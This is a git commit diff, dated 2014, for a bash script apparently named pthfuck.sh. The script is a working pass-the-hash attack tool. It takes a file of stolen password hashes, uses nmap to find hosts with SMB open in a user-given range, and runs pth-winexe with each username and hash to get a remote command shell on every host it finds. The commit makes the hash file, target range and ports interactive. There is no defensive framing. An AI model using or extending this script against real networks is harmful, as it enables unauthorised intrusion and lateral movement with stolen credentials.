779430f1275b5815c3aea08cd0f6ca471bd21108
zachsis <zachary.hatsis@gmail.com>
2014-09-10 09:48:10 -0600

    added user input

--- pthfuck.sh
+++ pthfuck.sh
@@ -1,12 +1,27 @@
 #!/bin/bash
-hashfile="/root/bin/passcrack/227/hashes"
+
+# hashfile="/root/bin/passcrack/227/hashes"
+
+read -p "hashfile path: " hashfile
+read -p "ip/iprange/network: " iprange
+read -p "port(s): " port
+
+excludehost=$(echo $hashfile | awk -v FS="/" '{print $4}') 
+export hashfile
+export iprange
+export port
+export excludehost
+
+echo '[*] begin' 
 for line in $(cat ${hashfile}); do 
   export smbhash=$(echo $line | awk -F: '{print $3 ":" $4}') 
   export smbuser=$(echo $line | awk -F: '{print $1}') 
-for host in $(nmap -p 445 192.168.15.200-254 -oG - | grep open | cut -d" " -f2); do 
-        echo "[+]"
+for host in $(nmap -p $port $iprange  -oG - | grep open | cut -d" " -f2); do 
+        if [ "$host" != "192.168.15.$excludehost" ]; then
         echo "[+] trying $smbuser@$host with $smbhash"
-        echo "[+]"
-        pth-winexe -U $smbuser%$smbhash //$host cmd; 
+            pth-winexe -U $smbuser%$smbhash //$host cmd; 
+        else 
+        true;
+        fi
     done
 done
